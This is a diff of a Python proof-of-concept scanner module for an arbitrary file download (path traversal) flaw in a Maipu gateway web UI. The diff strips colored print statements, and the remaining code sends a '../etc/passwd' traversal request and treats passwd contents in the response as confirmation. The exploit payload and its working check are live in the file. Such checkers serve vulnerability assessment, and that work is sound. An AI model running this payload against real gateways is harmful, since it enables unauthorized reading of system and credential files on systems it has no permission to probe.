@@ -8,8 +8,7 @@ description: 迈普网关参数过滤不严导致任意文件下载。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
 
 class mpsec_webui_filedownload_BaseVerify:
     def __init__(self, url):
@@ -24,23 +23,18 @@ class mpsec_webui_filedownload_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/sh" in req.text:
-                cprint("[+]存在迈普网关webui任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
                 return True, vulnurl, "迈普网关webui任意文件下载", str(payload), req.text
             vulnurl = self.url + "/webui/?g=sys_dia_data_check&file_name=../etc/passwd"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/sh" in req.text:
-                cprint("[+]存在迈普网关webui任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
                 return True, vulnurl, "迈普网关webui任意文件下载", str(payload), req.text
             else:
-                cprint("[-]不存在mpsec_webui_filedownload漏洞", "white", "on_grey")
                 return False, None, None, None, None
 
         except:
-            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
             return False, None, None, None, None
 
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = mpsec_webui_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
